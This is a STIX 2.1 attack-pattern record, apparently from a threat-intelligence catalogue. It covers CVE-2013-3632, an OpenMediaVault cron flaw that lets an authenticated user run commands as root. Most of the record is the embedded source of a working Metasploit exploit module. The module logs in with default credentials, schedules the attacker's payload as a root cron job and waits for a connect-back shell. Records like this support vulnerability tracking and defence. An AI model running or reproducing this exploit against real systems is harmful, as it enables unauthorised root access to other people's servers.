{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8abec053-c224-49cd-86a0-d68c79cf6393",
    "created": "2024-08-14T17:08:50.113164Z",
    "modified": "2024-08-14T17:08:50.113168Z",
    "name": "OpenMediaVault Cron Remote Command Execution",
    "description": " OpenMediaVault allows an authenticated user to create cron jobs as arbitrary users on the system. An attacker can abuse this to run arbitrary commands as any user available on the system (including root).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/openmediavault_cmd_exec.rb",
            "external_id": "openmediavault_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3632"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'OpenMediaVault Cron Remote Command Execution',\n      'Description'    => %q{\n      OpenMediaVault allows an authenticated user to create cron jobs as arbitrary users on the system.\n      An attacker can abuse this to run arbitrary commands as any user available on the system (including root).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-3632'],\n          ['URL', 'https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats']\n        ],\n      'Privileged' => true,\n      'DefaultOptions' => { 'WfsDelay' => 60 },\n      'Payload'        =>\n      {\n        'Compat'     =>\n        {\n          'PayloadType'  => 'cmd',\n          'RequiredCmd'  => 'generic perl ruby telnet python',\n        }\n      },\n      'Platform'       => ['unix', 'linux'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [['Automatic',{}]],\n      'DisclosureDate' => '2013-10-30',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n    [\n      OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'admin']),\n      OptString.new('PASSWORD', [ false, \"Password to authenticate with\", 'openmediavault'])\n    ])\n  end\n\n  def exploit\n    init = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/index.php')\n    })\n\n    sess = init.get_cookies\n    post = \"{\\\"service\\\":\\\"Authentication\\\",\\\"method\\\":\\\"login\\\",\\\"params\\\":{\\\"username\\\":\\\"#{datastore[\"USERNAME\"]}\\\",\\\"password\\\":\\\"#{datastore[\"PASSWORD\"]}\\\"}}\"\n\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/rpc.php'),\n      'data' => post,\n      'ctype' => 'application/json',\n      'cookie' => sess\n    })\n\n    if !login or login.code != 200\n      fail_with(Failure::NoAccess, \"Login failed\")\n    end\n\n    sess = login.get_cookies\n    post = '{\"service\":\"Cron\",\"method\":\"set\",\"params\":{\"enable\":true,\"minute\":\"*\",\"hour\":\"*\",\"dayofmonth\":\"*\",\"month\":\"*\",\"dayofweek\":\"*\",\"username\":\"root\",\"command\":\"'\n    post << payload.encoded.gsub('\"', '\\\"')\n    post << '\",\"comment\":\"\",\"type\":\"userdefined\",\"everynminute\":false,\"everynhour\":false,\"everyndayofmonth\":false,\"sendemail\":false,\"uuid\":\"undefined\"}}'\n\n    resp = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/rpc.php'),\n      'data' => post,\n      'ctype' => 'application/json',\n      'cookie' => sess\n    })\n\n    if !resp or resp.code != 200\n      fail_with(Failure::UnexpectedReply, \"Posting cron failed\")\n    end\n\n    print_status(\"Waiting for connect-back, this will take up to a minute\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}